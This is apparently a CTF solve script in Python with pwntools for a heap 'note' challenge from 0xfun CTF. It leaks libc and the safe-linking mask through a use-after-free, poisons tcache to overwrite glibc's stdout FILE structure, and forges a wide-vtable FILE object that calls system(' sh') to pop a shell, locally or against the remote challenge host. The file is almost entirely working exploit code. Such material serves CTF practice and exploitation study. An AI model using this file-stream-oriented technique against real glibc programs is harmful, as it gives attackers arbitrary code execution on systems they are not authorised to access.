#!/usr/bin/env python3
import os

from pwn import *

TARGET_PATH = os.path.realpath("/ctf-writeups/2026/0xfun-ctf/pwn/67/dist/chall")
LD_PATH = os.path.realpath(
    "/ctf-writeups/2026/0xfun-ctf/pwn/67/dist/ld-linux-x86-64.so.2"
)
LIBC_PATH = os.path.realpath("/ctf-writeups/2026/0xfun-ctf/pwn/67/dist/libc.so.6")
LIBRARY_PATH = os.path.dirname(LIBC_PATH)
MAIN_ARENA_OFFSET = 0x1E7C20

elf = context.binary = ELF(TARGET_PATH)
libc = ELF(LIBC_PATH)

context.update(log_level="debug", terminal=["tmux", "split-window", "-h"])


def get_stream():
    if "remote" in sys.argv:
        return remote("chall.0xfun.org", 14673)

    return process([LD_PATH, "--library-path", LIBRARY_PATH, TARGET_PATH])


def attach_gdb(r):
    if "debug" in sys.argv:
        bkps = []
        cmds = []

        gdbscript = ["break {}".format(x) for x in bkps] + cmds
        gdb.attach(r, "\n".join(gdbscript))


def create_note(r, idx, size, data):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", f"{idx}".encode())
    r.sendlineafter(b": ", f"{size}".encode())
    r.sendafter(b": ", data)


def delete_note(r, idx):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", f"{idx}".encode())


def read_note(r, idx):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b": ", f"{idx}".encode())


def edit_note(r, idx, data):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b": ", f"{idx}".encode())
    r.sendafter(b": ", data)


def exploit(r):
    [create_note(r, i, 0x100, b"A") for i in range(8)]
    [delete_note(r, i) for i in range(8, -1, -1)]
    read_note(r, 0)
    r.recvuntil(b"Data: ")
    main_arena = u64(r.recv(8))
    libc.address = main_arena - MAIN_ARENA_OFFSET
    log.info(f"libc.address: {hex(libc.address)}")

    read_note(r, 7)
    r.recvuntil(b"Data: ")
    mangler = u64(r.recv(8))
    log.info(f"mangler: {hex(mangler)}")

    target = mangler ^ libc.sym._IO_2_1_stdout_
    edit_note(r, 1, p64(target))
    create_note(r, 0, 0x100, b"A")

    fs = FileStructure()
    fs.flags = u32(" sh\0")
    fs._lock = libc.address + 0x1E9790
    fs.vtable = libc.sym._IO_wfile_jumps - 0x20
    fs._wide_data = libc.sym._IO_2_1_stdout_
    fs._IO_save_end = libc.sym.system
    create_note(r, 0, 0x100, bytes(fs) + p64(libc.sym._IO_2_1_stdout_ - 0x10))

    r.interactive()


def main():
    r = get_stream()
    attach_gdb(r)
    exploit(r)


if __name__ == "__main__":
    main()
